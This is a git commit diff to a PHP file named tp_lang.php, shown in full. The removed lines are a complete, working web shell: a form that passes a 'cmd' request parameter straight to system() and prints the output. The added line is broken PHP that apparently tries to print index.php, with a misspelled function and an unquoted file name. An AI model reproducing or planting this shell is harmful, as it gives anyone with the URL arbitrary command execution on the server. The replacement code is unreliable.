dffccb7e99809ff495ed935230ac73546e53808e
Kujaii_ <141361315+Kujaii@users.noreply.github.com>
2025-03-25 16:36:50 +0100

    Update tp_lang.php

--- tp_lang.php
+++ tp_lang.php
@@ -1,16 +1,3 @@
-<html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
 <?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd'] . ' 2>&1');
-    }
+echo file_get_content(index.php);
 ?>
-</pre>
-</body>
-</html>
